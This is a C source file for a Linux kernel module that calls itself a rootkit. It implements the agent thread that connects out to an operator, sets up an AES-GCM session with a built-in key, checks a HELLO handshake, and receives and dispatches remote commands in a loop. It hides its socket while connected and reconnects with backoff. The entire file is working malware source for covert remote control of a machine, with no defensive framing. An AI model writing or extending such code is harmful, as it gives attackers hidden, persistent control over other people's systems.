// SPDX-License-Identifier: GPL-2.0
// network/agent.c - Agent kthread: connect, handshake, session loop.
#include <crypto/aead.h>
#include <linux/delay.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/random.h>
#include <linux/slab.h>
#include <net/net_namespace.h>

#include "rootkit.h"

// Exchange encrypted HELLO to confirm both sides share the key.
static int rk_handshake(struct rk_session *s)
{
	u8 buf[32];
	size_t len;
	int error;

	error = rk_send_sealed(s, (const u8 *)"HELLO", 5);
	if (error)
		return error;

	error = rk_recv_sealed(s, buf, sizeof(buf), &len);
	if (error)
		return error;

	if (len != 5 || memcmp(buf, "HELLO", 5) != 0)
		return -EPROTO;

	return 0;
}

// Initialize AEAD transform and session state.
static int rk_session_init(struct rk_session *sess, struct socket *sock)
{
	int error;

	sess->tfm = crypto_alloc_aead("gcm(aes)", 0, 0);
	if (IS_ERR(sess->tfm))
		return PTR_ERR(sess->tfm);

	error = crypto_aead_setauthsize(sess->tfm, RK_TAG_LEN);
	if (error)
		goto free_tfm;

	error = crypto_aead_setkey(sess->tfm, rk_key, RK_KEY_LEN);
	if (error)
		goto free_tfm;

	get_random_bytes(&sess->session_id, sizeof(sess->session_id));
	sess->sock = sock;
	sess->tx_seq = 0;
	sess->rx_seq_expected = 0;
	return 0;

free_tfm:
	crypto_free_aead(sess->tfm);
	return error;
}

// Receive commands, dispatch, loop.
static void rk_handle_session(struct rk_session *s)
{
	u8 *cmd;
	size_t cmd_len;
	int error;

	cmd = kmalloc(RK_FRAME_MAX, GFP_KERNEL);
	if (!cmd)
		return;

	while (!kthread_should_stop()) {
		error = rk_recv_sealed(s, cmd, RK_FRAME_MAX, &cmd_len);
		if (error)
			break;

		error = rk_dispatch(s, cmd, cmd_len);
		if (error)
			break;
	}

	kfree(cmd);
}

// Connect to the operator and run an encrypted session.
int rk_agent_thread(void *data)
{
	unsigned int delay_ms = retry_base_ms;

	while (!kthread_should_stop()) {
		struct rk_session sess;
		struct socket *sock;
		int error;

		sock = rk_connect();
		if (IS_ERR(sock))
			goto retry;

		error = rk_session_init(&sess, sock);
		if (error)
			goto close_retry;

		error = rk_handshake(&sess);
		if (error)
			goto free_tfm;

		delay_ms = retry_base_ms;
		rk_auto_hide(sock);
		rk_handle_session(&sess);
		rk_auto_unhide();

free_tfm:
		crypto_free_aead(sess.tfm);
close_retry:
		kernel_sock_shutdown(sock, SHUT_RDWR);
		sock_release(sock);
retry:
		if (!kthread_should_stop()) {
			msleep_interruptible(delay_ms);
			if (delay_ms < retry_max_ms)
				delay_ms = min(delay_ms * 2, retry_max_ms);
		}
	}

	return 0;
}
